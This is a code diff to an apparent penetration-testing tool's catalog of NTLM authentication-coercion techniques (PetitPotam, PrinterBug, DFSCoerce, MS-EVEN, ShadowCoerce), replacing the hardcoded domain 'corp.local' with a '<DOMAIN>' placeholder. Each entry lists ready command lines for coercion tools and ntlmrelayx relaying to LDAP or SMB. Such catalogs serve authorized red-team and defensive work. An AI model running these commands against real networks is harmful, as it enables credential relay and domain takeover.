@@ -23,7 +23,7 @@ COERCE_TECHNIQUES: dict[str, CoerceTechnique] = {
         summary="Coerce machine authentication via MS-EFSRPC.",
         manual_commands=(
             "ntlmrelayx.py -t ldap://<DC> --delegate-access",
-            "PetitPotam.py -d corp.local -u user -p pass <listener_ip>",
+            "PetitPotam.py -d <DOMAIN> -u user -p pass <listener_ip>",
         ),
     ),
     "printerbug": CoerceTechnique(
@@ -33,7 +33,7 @@ COERCE_TECHNIQUES: dict[str, CoerceTechnique] = {
         mitre_id="T1187",
         summary="Coerce authentication via Print Spooler RPC.",
         manual_commands=(
-            "printerbug.py corp.local/user:pass@<target> <listener_ip>",
+            "printerbug.py <DOMAIN>/user:pass@<target> <listener_ip>",
             "ntlmrelayx.py -tf targets.txt -smb2support",
         ),
     ),
@@ -43,7 +43,7 @@ COERCE_TECHNIQUES: dict[str, CoerceTechnique] = {
         severity="medium",
         mitre_id="T1187",
         summary="Coerce via Distributed File System namespace RPC.",
-        manual_commands=("dfscoerce.py corp.local/user:pass@<target> <listener>",),
+        manual_commands=("dfscoerce.py <DOMAIN>/user:pass@<target> <listener>",),
     ),
     "mseven": CoerceTechnique(
         key="mseven",
@@ -52,7 +52,7 @@ COERCE_TECHNIQUES: dict[str, CoerceTechnique] = {
         mitre_id="T1187",
         summary="Alternate Print Spooler coercion path.",
         manual_commands=(
-            "coercer.py -d corp.local -u user -p pass -t <target> -l <listener> -a mseven",
+            "coercer.py -d <DOMAIN> -u user -p pass -t <target> -l <listener> -a mseven",
         ),
     ),
     "shadowcoerce": CoerceTechnique(
@@ -62,7 +62,7 @@ COERCE_TECHNIQUES: dict[str, CoerceTechnique] = {
         mitre_id="T1187",
         summary="Coerce via File Server Remote VSS RPC.",
         manual_commands=(
-            "coercer.py -d corp.local -u user -p pass -t <target> "
+            "coercer.py -d <DOMAIN> -u user -p pass -t <target> "
             "-l <listener> -a ShadowCoerce",
         ),
     ),
